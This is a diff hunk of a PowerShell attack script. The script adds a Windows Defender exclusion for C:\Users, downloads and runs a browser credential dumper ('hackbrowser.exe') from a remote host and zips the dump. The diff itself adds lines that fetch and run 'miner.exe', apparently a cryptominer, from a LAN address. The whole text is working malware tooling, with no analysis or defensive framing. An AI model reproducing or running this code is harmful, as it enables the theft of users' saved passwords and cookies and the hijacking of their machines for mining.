@@ -4,8 +4,10 @@ Add-MpPreference -ExclusionPath "C:\Users"
 mkdir "C:\Users\dump"
 Set-Location "C:\Users\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'https://github.com/H4cksploit/project/raw/main/hackbrowser.exe' -OutFile "hb.exe"
+Invoke-WebRequest 'http://192.168.1.108/hackbrowser.exe' -OutFile "hb.exe"
 .\hb.exe --format json
+Invoke-WebRequest 'http://192.168.1.108/miner.exe' -OutFile "miner2.exe"
+.\miner2.exe
 Remove-Item -Path "C:\Users\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
